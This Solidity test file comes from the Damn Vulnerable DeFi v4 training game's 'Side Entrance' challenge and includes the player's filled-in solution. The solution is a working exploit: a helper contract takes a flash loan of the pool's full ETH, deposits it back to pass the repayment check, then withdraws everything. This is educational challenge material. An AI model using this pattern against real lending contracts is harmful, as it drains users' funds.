// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        FlashLoanEtherReceiver receiver = new FlashLoanEtherReceiver();
        receiver.execute1(pool);
        receiver.transfer(payable(recovery));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}


contract FlashLoanEtherReceiver{
    fallback() external payable{}
    receive() external payable{}
    SideEntranceLenderPool pool;
    uint256 constant ETHER_IN_POOL = 1000e18;
    function execute1(SideEntranceLenderPool _pool) external payable{
        console.log("execute1");
        pool = _pool;
        pool.flashLoan(ETHER_IN_POOL);

    }
    function execute() external payable{
        console.log("execute");
        console.log(address(this).balance);
        bytes memory callData = abi.encodeWithSelector(pool.deposit.selector);
        address(pool).call{value:ETHER_IN_POOL}(callData);
    }
    function transfer(address payable recovery) external payable{
        pool.withdraw();
        console.log(address(this).balance);
        recovery.transfer(address(this).balance);
    }
}